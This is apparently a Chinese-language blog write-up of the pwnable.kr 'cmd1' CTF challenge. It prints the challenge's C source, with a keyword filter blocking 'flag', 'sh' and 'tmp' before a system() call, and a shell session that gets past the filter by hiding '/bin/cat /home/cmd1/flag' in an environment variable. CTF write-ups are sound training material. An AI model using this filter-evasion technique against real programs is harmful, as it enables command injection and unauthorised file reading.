---
title: pwnable.kr-cmd1
date: 2018-01-28 13:26:00
tags: [pwnable.kr,PWN]
categories: CTF
copyright: true
---
## 前言
还是很有趣的题目，不过很基础，很适合我这样的新手。
## 分析
还是先贴源码`cmd1.c`
```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/fuckyouverymuch");
	if(filter(argv[1])) return 0;
	system( argv[1] );
	return 0;
}

```
程序开头就把环境变量`PATH`置为`/fuckyouverymuch`，然后检查了第一个传入参数，通过验证后直接执行第一个参数。
但是等等，开头就开始骂人了？这能忍？老子上去就是环境变量绕过关键字检查，不用你帮老子找`cat`程序在哪，老子知道它在`/bin/`目录下面，于是就有了下面的exp
```bash
cmd1@ubuntu:~$ export a="/bin/cat /home/cmd1/flag"
cmd1@ubuntu:~$ $a
/bin/cat: /home/cmd1/flag: Permission denied
cmd1@ubuntu:~$ ./cmd1 "\$a"
mommy now I get what PATH environment is for :)
cmd1@ubuntu:~$ 

```
平复一下心情，来细细讲一下为什么。程序getflag的第一步就是绕过`filter`函数的检查，这很好办直接用环境变量就可以了。
第二步，由于程序修改了`PATH`变量，导致执行`system`函数时无法找到外部命令，只能执行内部命令，这也很好办使用绝对路径就可以了。解决代码就是上面的。
## 总结
还是很简单的一道题，但是也还是很有趣。